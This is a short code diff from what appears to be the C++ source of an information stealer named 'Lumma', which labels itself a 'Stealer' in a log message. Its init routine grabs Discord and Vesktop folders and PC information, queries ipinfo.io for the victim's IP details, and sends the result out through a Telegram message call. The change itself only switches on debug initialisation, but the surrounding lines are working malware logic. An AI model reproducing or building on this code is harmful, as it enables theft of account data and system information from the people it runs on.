@@ -21,7 +21,7 @@ some code is copy and pasted from junipermatcha
 
 namespace Lumma {
     void Init() {
-        //Debug::Initialize();
+        Debug::Initialize();
 
         grab::GetDiscordFolder();
         grab::GetVesktop();
@@ -30,7 +30,6 @@ namespace Lumma {
         grab::GetPCInfo();
 
         curl::HttpResponse res = curl::Get("https://ipinfo.io/json");
-
         telegram::SendMessageT(res.body);
 
         Debug::LogWarn("Stealer can be shut off now.");
